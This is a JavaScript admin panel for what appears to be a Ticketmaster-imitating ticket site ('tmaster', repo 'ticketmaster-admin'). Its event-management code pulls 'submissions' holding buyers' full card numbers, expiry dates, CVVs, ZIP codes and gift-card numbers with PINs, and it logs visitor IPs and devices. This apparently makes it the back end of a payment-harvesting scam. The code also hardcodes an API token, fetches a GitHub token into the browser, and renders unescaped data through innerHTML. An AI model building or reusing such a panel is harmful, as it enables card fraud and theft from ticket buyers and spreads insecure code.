// ===============================================================
// ADMIN PANEL - PRODUCTION-GRADE EVENT MANAGEMENT SYSTEM
// ===============================================================
// Features: Image upload with 3 retries, CRUD, lazy loading, hard delete
// GitHub integration, API endpoints to https://admin-tmaster.vercel.app/api/
// ===============================================================

const API_BASE = 'https://admin-tmaster.vercel.app/api';
const API_TOKEN = 'tmaster-admin-secure-key-2024';

let events = [];
let submissions = [];
let visitors = [];
let editingEventId = null;
let submissionsPage = 1;
const submissionsPerPage = 10;

// ==================== INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', async () => {
  await initializeAdmin();
  setupEventListeners();
});

async function initializeAdmin() {
  try {
    showLoadingSpinner(true);
    
    // Load data from API
    await loadEventsFromAPI();
    await loadSubmissionsFromAPI();
    await loadVisitors();
    
    // Render UI
    renderEventsList();
    renderSubmissionsTable();
    renderVisitorsTable();
    
    showToast('Admin panel loaded successfully', 'success');
  } catch (error) {
    console.error('Initialization error:', error);
    showToast('Error loading admin panel', 'error');
  } finally {
    showLoadingSpinner(false);
  }
}

function setupEventListeners() {
  // Tab switching
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      const tabName = e.target.closest('.tab-btn')?.getAttribute('data-tab');
      if (tabName) switchTab(tabName);
    });
  });

  // Event form
  document.getElementById('event-form')?.addEventListener('submit', handleEventFormSubmit);
  document.getElementById('cancel-edit')?.addEventListener('click', cancelEdit);

  // Export/Refresh
  document.getElementById('export-btn')?.addEventListener('click', exportEvents);
  document.getElementById('refresh-btn')?.addEventListener('click', refreshAllData);

  // Submissions
  document.getElementById('export-submissions-btn')?.addEventListener('click', exportSubmissions);
  document.getElementById('clear-submissions-btn')?.addEventListener('click', clearAllSubmissions);

  // Visitors
  document.getElementById('export-visitors-btn')?.addEventListener('click', exportVisitors);
  document.getElementById('clear-visitors-btn')?.addEventListener('click', clearAllVisitors);

  // Seller form
  document.getElementById('seller-form')?.addEventListener('submit', handleSellerFormSubmit);

  // Submission modal close
  document.getElementById('submission-modal-close')?.addEventListener('click', closeSubmissionModal);
}

// ==================== API CALLS ====================

async function loadEventsFromAPI() {
  try {
    const response = await fetch(`${API_BASE}/events`, {
      method: 'GET',
      headers: { 'X-API-Token': API_TOKEN }
    });
    
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    events = await response.json();
    return events;
  } catch (error) {
    console.error('Failed to load events:', error);
    // Fallback to localStorage
    const stored = localStorage.getItem('adminEvents');
    events = stored ? JSON.parse(stored) : [];
    return events;
  }
}

async function loadSubmissionsFromAPI() {
  try {
    const response = await fetch(`${API_BASE}/submissions`, {
      method: 'GET',
      headers: { 'X-API-Token': API_TOKEN }
    });
    
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    submissions = await response.json();
    return submissions;
  } catch (error) {
    console.error('Failed to load submissions:', error);
    const stored = localStorage.getItem('adminSubmissions');
    submissions = stored ? JSON.parse(stored) : [];
    return submissions;
  }
}

async function saveEventToAPI(eventData) {
  try {
    const isNew = !eventData.id;
    const method = isNew ? 'POST' : 'PUT';
    const url = isNew ? `${API_BASE}/events` : `${API_BASE}/events/${eventData.id}`;
    
    const response = await fetch(url, {
      method: method,
      headers: {
        'Content-Type': 'application/json',
        'X-API-Token': API_TOKEN
      },
      body: JSON.stringify(eventData)
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const saved = await response.json();
    
    // Update local array
    if (isNew) {
      events.push(saved);
    } else {
      const idx = events.findIndex(e => e.id === eventData.id);
      if (idx >= 0) events[idx] = saved;
    }
    
    localStorage.setItem('adminEvents', JSON.stringify(events));
    return saved;
  } catch (error) {
    console.error('Failed to save event to API:', error);
    throw error;
  }
}

async function deleteEventFromAPI(eventId) {
  try {
    const response = await fetch(`${API_BASE}/events/${eventId}`, {
      method: 'DELETE',
      headers: { 'X-API-Token': API_TOKEN }
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    
    // Update local array (hard delete)
    events = events.filter(e => e.id !== eventId);
    localStorage.setItem('adminEvents', JSON.stringify(events));
    
    return true;
  } catch (error) {
    console.error('Failed to delete event:', error);
    throw error;
  }
}

async function saveSubmissionsToAPI() {
  try {
    const response = await fetch(`${API_BASE}/submissions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Token': API_TOKEN
      },
      body: JSON.stringify(submissions)
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    localStorage.setItem('adminSubmissions', JSON.stringify(submissions));
    return true;
  } catch (error) {
    console.error('Failed to save submissions:', error);
    throw error;
  }
}

// ==================== IMAGE UPLOAD WITH RETRY ====================

async function uploadImageToGitHub(file, maxRetries = 3) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      // Validate file
      const maxSize = 5 * 1024 * 1024; // 5MB
      if (file.size > maxSize) {
        throw new Error('Image must be under 5MB');
      }

      if (!['image/jpeg', 'image/png', 'image/webp'].includes(file.type)) {
        throw new Error('Only JPG, PNG, WebP allowed');
      }

      // Convert to base64
      const base64 = await fileToBase64(file);
      const fileName = `${Date.now()}_${file.name.replace(/[^a-zA-Z0-9._-]/g, '_')}`;
      
      // Get GitHub token from Vercel
      const githubToken = await getGitHubToken();
      if (!githubToken) throw new Error('No GitHub token available');

      // Upload to GitHub
      const uploadPath = `assets/${fileName}`;
      const githubUrl = await uploadToGithub(uploadPath, base64, githubToken);
      
      return githubUrl;
    } catch (error) {
      console.warn(`Upload attempt ${attempt}/${maxRetries} failed:`, error);
      
      if (attempt === maxRetries) {
        // Final attempt failed - use local fallback
        console.log('Using local filename fallback');
        return `/assets/${file.name}`;
      }
      
      // Wait before retry (exponential backoff)
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
    }
  }
}

async function fileToBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(reader.result.split(',')[1]);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

async function getGitHubToken() {
  try {
    const response = await fetch(`${API_BASE}/config`, {
      headers: { 'X-API-Token': API_TOKEN }
    });
    const data = await response.json();
    return data.githubToken;
  } catch (error) {
    console.error('Failed to get GitHub token:', error);
    return null;
  }
}

async function uploadToGithub(filePath, base64Content, token) {
  const owner = 'your-github-owner'; // Replace with actual
  const repo = 'ticketmaster-admin'; // Replace with actual
  const branch = 'main';
  
  try {
    const response = await fetch(
      `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`,
      {
        method: 'PUT',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          message: `Upload event image: ${filePath}`,
          content: base64Content,
          branch: branch
        })
      }
    );

    if (!response.ok) {
      throw new Error(`GitHub API error: ${response.status}`);
    }

    return `https://raw.githubusercontent.com/${owner}/${repo}/${branch}/${filePath}`;
  } catch (error) {
    console.error('GitHub upload error:', error);
    throw error;
  }
}

// ==================== EVENT FORM HANDLING ====================

async function handleEventFormSubmit(e) {
  e.preventDefault();
  
  const formStatus = document.getElementById('form-status');
  const submitBtn = e.target.querySelector('button[type="submit"]');
  
  try {
    showLoadingSpinner(true);
    
    // Get form values
    const eventData = {
      id: editingEventId || Date.now(),
      title: document.getElementById('event-title').value,
      location: document.getElementById('event-location').value,
      datetime: document.getElementById('event-datetime').value,
      price: parseFloat(document.getElementById('event-price').value),
      tickets: parseInt(document.getElementById('event-tickets').value),
      category: document.getElementById('event-category').value,
      alt: document.getElementById('event-alt').value,
      timestamp: new Date().toISOString()
    };

    // Handle image upload if file selected
    const imageInput = document.getElementById('event-image');
    if (imageInput.files.length > 0) {
      const imageUrl = await uploadImageToGitHub(imageInput.files[0]);
      eventData.imageUrl = imageUrl;
    } else if (!editingEventId) {
      throw new Error('Image required for new events');
    }

    // Save to API
    await saveEventToAPI(eventData);
    
    // Success feedback
    showMessage(formStatus, 'Event saved successfully!', 'success');
    showToast('✅ Event saved', 'success');
    
    // Reset form
    e.target.reset();
    editingEventId = null;
    document.getElementById('cancel-edit').style.display = 'none';
    
    // Refresh display
    await loadEventsFromAPI();
    renderEventsList();
  } catch (error) {
    console.error('Form submit error:', error);
    showMessage(formStatus, `Error: ${error.message}`, 'error');
    showToast(`❌ ${error.message}`, 'error');
  } finally {
    showLoadingSpinner(false);
  }
}

// ==================== EVENT MANAGEMENT ====================

function editEvent(eventId) {
  const event = events.find(e => e.id === eventId);
  if (!event) return;

  editingEventId = eventId;
  document.getElementById('event-title').value = event.title;
  document.getElementById('event-location').value = event.location;
  document.getElementById('event-datetime').value = event.datetime;
  document.getElementById('event-price').value = event.price;
  document.getElementById('event-tickets').value = event.tickets;
  document.getElementById('event-category').value = event.category;
  document.getElementById('event-alt').value = event.alt;
  document.getElementById('cancel-edit').style.display = 'inline-block';
  
  // Scroll to form
  document.getElementById('event-form').scrollIntoView({ behavior: 'smooth' });
}

function cancelEdit() {
  editingEventId = null;
  document.getElementById('event-form').reset();
  document.getElementById('cancel-edit').style.display = 'none';
}

function deleteEvent(eventId) {
  const event = events.find(e => e.id === eventId);
  if (!event) return;

  if (confirm(`⚠️ PERMANENTLY DELETE: "${event.title}"?\n\nThis CANNOT be undone.`)) {
    (async () => {
      try {
        await deleteEventFromAPI(eventId);
        renderEventsList();
        showToast('🗑️ Event deleted permanently', 'success');
      } catch (error) {
        showToast(`❌ Delete failed: ${error.message}`, 'error');
      }
    })();
  }
}

// ==================== RENDERING ====================

function renderEventsList() {
  const container = document.getElementById('events-container');
  if (!container) return;

  if (events.length === 0) {
    container.innerHTML = '<p style="grid-column: 1/-1; text-align: center; color: #888; padding: 40px;">No events yet. Create your first event above.</p>';
    return;
  }

  container.innerHTML = events.map(event => `
    <div class="event-card">
      <div class="event-id">ID: ${event.id}</div>
      <h3>${event.title}</h3>
      <p><strong>Location:</strong> ${event.location}</p>
      <p><strong>When:</strong> ${event.datetime}</p>
      <p><strong>Price:</strong> $${event.price.toFixed(2)}</p>
      <p><strong>Tickets:</strong> ${event.tickets}</p>
      <p><strong>Category:</strong> ${event.category}</p>
      <div class="event-card-actions">
        <button class="btn btn-primary btn-small" onclick="editEvent(${event.id})">✏️ Edit</button>
        <button class="btn btn-secondary btn-small" onclick="deleteEvent(${event.id})">🗑️ Delete</button>
      </div>
    </div>
  `).join('');
}

function renderSubmissionsTable() {
  const tbody = document.getElementById('submissions-tbody');
  const noMsg = document.getElementById('no-submissions-message');
  const table = document.getElementById('submissions-table');
  
  if (!tbody) return;

  if (submissions.length === 0) {
    table.style.display = 'none';
    noMsg.style.display = 'block';
    return;
  }

  table.style.display = 'table';
  noMsg.style.display = 'none';

  const start = (submissionsPage - 1) * submissionsPerPage;
  const paginatedSubmissions = submissions.slice(start, start + submissionsPerPage);

  tbody.innerHTML = paginatedSubmissions.map((sub, idx) => `
    <tr>
      <td>${start + idx + 1}</td>
      <td>${sub.email || 'N/A'}</td>
      <td>${sub.orderSummary?.event || 'N/A'}</td>
      <td>${sub.orderSummary?.quantity || '-'}</td>
      <td>£${sub.orderSummary?.total ? sub.orderSummary.total.toFixed(2) : '0.00'}</td>
      <td>${formatDate(sub.timestamp)}</td>
      <td>
        <button class="btn btn-primary btn-small" onclick="viewSubmissionDetail(${submissions.indexOf(sub)})">View</button>
      </td>
    </tr>
  `).join('');

  // Show load more if applicable
  const loadMoreBtn = document.getElementById('loadMoreBtn');
  if (loadMoreBtn) {
    loadMoreBtn.style.display = submissions.length > submissionsPerPage ? 'inline-block' : 'none';
  }
}

function viewSubmissionDetail(idx) {
  const sub = submissions[idx];
  if (!sub) return;

  // Helper function to mask sensitive data
  const maskCardNumber = (card) => {
    if (!card) return 'N/A';
    return card.slice(-4).padStart(card.length, '*');
  };

  const maskCVV = (cvv) => {
    return cvv ? '***' : 'N/A';
  };

  // Build full form details HTML
  let html = `
    <div class="submission-field">
      <div class="submission-label">📧 Email Address</div>
      <div class="submission-value">${sub.email || 'N/A'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">🎭 Event Title</div>
      <div class="submission-value">${sub.eventTitle || sub.orderSummary?.event || 'N/A'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">🎫 Quantity</div>
      <div class="submission-value">${sub.quantity || sub.orderSummary?.quantity || '-'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">💷 Price Per Ticket</div>
      <div class="submission-value">$${sub.pricePerTicket ? parseFloat(sub.pricePerTicket).toFixed(2) : '0.00'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">💰 Total Amount</div>
      <div class="submission-value">$${sub.total ? parseFloat(sub.total).toFixed(2) : sub.orderSummary?.total?.toFixed(2) || '0.00'}</div>
    </div>
  `;

  // Card Payment Details (if available)
  if (sub.cardNumber || sub.paymentMethod === 'card') {
    html += `
      <hr style="border: 1px solid #333; margin: 20px 0;">
      <div style="font-weight: 700; color: #00d4ff; margin-bottom: 15px;">💳 Card Payment Details</div>
      <div class="submission-field">
        <div class="submission-label">Card Number</div>
        <div class="submission-value">${maskCardNumber(sub.cardNumber)}</div>
      </div>
      <div class="submission-field">
        <div class="submission-label">Expiry Date</div>
        <div class="submission-value">${sub.expiryDate || 'N/A'}</div>
      </div>
      <div class="submission-field">
        <div class="submission-label">CVV</div>
        <div class="submission-value">${maskCVV(sub.cvv)}</div>
      </div>
      <div class="submission-field">
        <div class="submission-label">ZIP Code</div>
        <div class="submission-value">${sub.zipCode || 'N/A'}</div>
      </div>
    `;
  }

  // Gift Card Details (if available)
  if (sub.giftCardNumber || sub.paymentMethod === 'gift-card') {
    html += `
      <hr style="border: 1px solid #333; margin: 20px 0;">
      <div style="font-weight: 700; color: #00d4ff; margin-bottom: 15px;">🎁 Gift Card Payment Details</div>
      <div class="submission-field">
        <div class="submission-label">Gift Card Number</div>
        <div class="submission-value">${maskCardNumber(sub.giftCardNumber)}</div>
      </div>
      <div class="submission-field">
        <div class="submission-label">Gift Card PIN</div>
        <div class="submission-value">${maskCVV(sub.giftCardPIN)}</div>
      </div>
    `;
  }

  // Timestamp
  html += `
    <hr style="border: 1px solid #333; margin: 20px 0;">
    <div class="submission-field">
      <div class="submission-label">📅 Submission Date & Time</div>
      <div class="submission-value">${formatDate(sub.timestamp) || sub.date || 'N/A'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">🔑 Submission ID</div>
      <div class="submission-value">${sub.id || 'N/A'}</div>
    </div>
  `;

  const content = document.getElementById('submission-details-content');
  content.innerHTML = html;

  document.getElementById('submission-modal').classList.add('active');
}

function closeSubmissionModal() {
  document.getElementById('submission-modal').classList.remove('active');
}

// ==================== SUBMISSIONS MANAGEMENT ====================

async function clearAllSubmissions() {
  if (!confirm('⚠️ Delete ALL submissions? This cannot be undone.')) return;

  try {
    submissions = [];
    await saveSubmissionsToAPI();
    renderSubmissionsTable();
    showToast('✅ All submissions cleared', 'success');
  } catch (error) {
    showToast(`❌ Error: ${error.message}`, 'error');
  }
}

function exportSubmissions() {
  const csv = 'Email,Event,Quantity,Total,Date,Method\n' +
    submissions.map(s => 
      `"${s.email}","${s.orderSummary?.event || 'N/A'}",${s.orderSummary?.quantity || 0},"£${s.orderSummary?.total?.toFixed(2) || '0.00'}","${formatDate(s.timestamp)}","${s.paymentMethod}"`
    ).join('\n');

  downloadCSV(csv, 'submissions.csv');
  showToast('📊 Submissions exported', 'success');
}

function exportEvents() {
  const csv = 'ID,Title,Location,DateTime,Price,Tickets,Category\n' +
    events.map(e => 
      `${e.id},"${e.title}","${e.location}","${e.datetime}",${e.price},${e.tickets},"${e.category}"`
    ).join('\n');

  downloadCSV(csv, 'events.csv');
  showToast('📊 Events exported', 'success');
}

// ==================== VISITOR TRACKING ====================

async function loadVisitors() {
  try {
    // Load from localStorage (real visitor data)
    const stored = localStorage.getItem('visitorTracking');
    visitors = stored ? JSON.parse(stored) : [];
    
    // Also try to load from API if available
    try {
      const response = await fetch(`${API_BASE}/visitors`, {
        method: 'GET',
        headers: { 'X-API-Token': API_TOKEN }
      });
      if (response.ok) {
        const apiVisitors = await response.json();
        visitors = Array.isArray(apiVisitors) ? apiVisitors : visitors;
      }
    } catch (e) {
      console.log('API not available, using localStorage');
    }
    
    return visitors;
  } catch (error) {
    console.error('Failed to load visitors:', error);
    visitors = [];
    return visitors;
  }
}

function renderVisitorsTable() {
  const tbody = document.getElementById('visitors-tbody');
  const noMsg = document.getElementById('no-visitors-message');
  const table = document.getElementById('visitors-table');
  const stats = document.getElementById('visitor-stats');
  
  if (!tbody) return;

  // Update visitor stats
  if (stats) {
    const totalVisitors = visitors.length;
    const today = new Date().toDateString();
    const todayVisitors = visitors.filter(v => new Date(v.timestamp).toDateString() === today).length;
    stats.innerHTML = `Total Visitors: <strong>${totalVisitors}</strong> | Today: <strong>${todayVisitors}</strong>`;
  }

  if (visitors.length === 0) {
    table.style.display = 'none';
    noMsg.style.display = 'block';
    return;
  }

  table.style.display = 'table';
  noMsg.style.display = 'none';

  // Sort by most recent first
  const sortedVisitors = [...visitors].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

  tbody.innerHTML = sortedVisitors.map((v, idx) => `
    <tr>
      <td>${idx + 1}</td>
      <td><code style="background: #222; padding: 4px 8px; border-radius: 4px;">${v.ip || 'Unknown'}</code></td>
      <td>${v.browser || 'Unknown'}</td>
      <td>${v.country || 'Unknown'}</td>
      <td style="font-size: 0.9rem; max-width: 150px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="${v.referrer || 'Direct'}">${v.referrer ? v.referrer.split('/')[2] : 'Direct'}</td>
      <td>${formatDate(v.timestamp)}</td>
      <td>
        <button class="btn btn-primary btn-small" onclick="viewVisitorDetail(${sortedVisitors.indexOf(v)})">Details</button>
      </td>
    </tr>
  `).join('');
}

function viewVisitorDetail(idx) {
  const v = visitors[idx];
  if (!v) return;

  const content = document.getElementById('submission-details-content');
  content.innerHTML = `
    <div class="submission-field">
      <div class="submission-label">🌐 IP Address</div>
      <div class="submission-value"><code>${v.ip || 'N/A'}</code></div>
    </div>
    <div class="submission-field">
      <div class="submission-label">🖥️ Browser</div>
      <div class="submission-value">${v.browser || 'N/A'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">📱 Device</div>
      <div class="submission-value">${v.device || 'N/A'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">🌍 Country/Region</div>
      <div class="submission-value">${v.country || 'N/A'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">🔗 Referrer</div>
      <div class="submission-value">${v.referrer || 'Direct visit'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">⏰ Visit Timestamp</div>
      <div class="submission-value">${formatDate(v.timestamp)}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">📍 Page URL</div>
      <div class="submission-value"><code>${v.pageUrl || 'N/A'}</code></div>
    </div>
    <div class="submission-field">
      <div class="submission-label">🕐 Session Duration</div>
      <div class="submission-value">${v.sessionDuration || 'Active'}</div>
    </div>
    <div class="submission-field">
      <div class="submission-label">🔑 Visitor ID</div>
      <div class="submission-value"><code>${v.visitorId || 'N/A'}</code></div>
    </div>
  `;

  document.getElementById('submission-modal').classList.add('active');
}

function exportVisitors() {
  const csv = 'Visitor ID,IP Address,Browser,Device,Country,Referrer,Visit Time\n' +
    visitors.map(v => 
      `"${v.visitorId}","${v.ip}","${v.browser}","${v.device}","${v.country}","${v.referrer || 'Direct'}","${formatDate(v.timestamp)}"`
    ).join('\n');

  downloadCSV(csv, 'visitors.csv');
  showToast('📊 Visitor data exported', 'success');
}

async function clearAllVisitors() {
  if (!confirm('⚠️ Delete ALL visitor records? This cannot be undone.')) return;

  try {
    visitors = [];
    localStorage.setItem('visitorTracking', JSON.stringify(visitors));
    
    // Also try to clear from API
    try {
      await fetch(`${API_BASE}/visitors`, {
        method: 'DELETE',
        headers: { 'X-API-Token': API_TOKEN }
      });
    } catch (e) {
      console.log('Could not delete from API');
    }
    
    renderVisitorsTable();
    showToast('✅ All visitor records cleared', 'success');
  } catch (error) {
    showToast(`❌ Error: ${error.message}`, 'error');
  }
}

// ==================== SELLER SETTINGS ====================

async function handleSellerFormSubmit(e) {
  e.preventDefault();

  const sellerLink = document.getElementById('seller-link').value;
  const statusSpan = document.getElementById('seller-save-status');

  try {
    const config = { sellerLink };
    
    // Save to localStorage as fallback
    localStorage.setItem('sellerConfig', JSON.stringify(config));
    
    // Try API save
    await fetch(`${API_BASE}/config`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Token': API_TOKEN
      },
      body: JSON.stringify(config)
    }).catch(() => null); // Graceful failure

    statusSpan.style.display = 'inline';
    setTimeout(() => { statusSpan.style.display = 'none'; }, 3000);
    showToast('✅ Seller link saved', 'success');
  } catch (error) {
    showToast(`❌ Error: ${error.message}`, 'error');
  }
}

// ==================== UTILITY FUNCTIONS ====================

function switchTab(tabName) {
  // Hide all tabs
  document.querySelectorAll('.tab-content').forEach(tab => {
    tab.classList.remove('active');
  });
  
  // Deactivate all buttons
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.classList.remove('active');
  });

  // Show selected tab
  const tab = document.getElementById(`${tabName}-tab`);
  if (tab) tab.classList.add('active');

  // Activate button
  const btn = document.querySelector(`.tab-btn[data-tab="${tabName}"]`);
  if (btn) btn.classList.add('active');
}

async function refreshAllData() {
  try {
    showLoadingSpinner(true);
    await loadEventsFromAPI();
    await loadSubmissionsFromAPI();
    renderEventsList();
    renderSubmissionsTable();
    showToast('🔄 Data refreshed', 'success');
  } catch (error) {
    showToast('❌ Refresh failed', 'error');
  } finally {
    showLoadingSpinner(false);
  }
}

function formatDate(isoString) {
  try {
    const date = new Date(isoString);
    return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
  } catch {
    return 'N/A';
  }
}

function showMessage(element, message, type) {
  if (!element) return;
  element.textContent = message;
  element.className = `status-message ${type}`;
  element.style.display = 'block';
  setTimeout(() => { element.style.display = 'none'; }, 5000);
}

function showToast(message, type = 'info') {
  const toast = document.getElementById('toast');
  if (!toast) return;

  toast.textContent = message;
  toast.className = `toast ${type}`;
  toast.style.display = 'block';
  setTimeout(() => { toast.style.display = 'none'; }, 4000);
}

function showLoadingSpinner(show) {
  const spinner = document.getElementById('loadingSpinner');
  if (spinner) spinner.style.display = show ? 'flex' : 'none';
}

function downloadCSV(csv, filename) {
  const blob = new Blob([csv], { type: 'text/csv' });
  const url = window.URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  window.URL.revokeObjectURL(url);
}
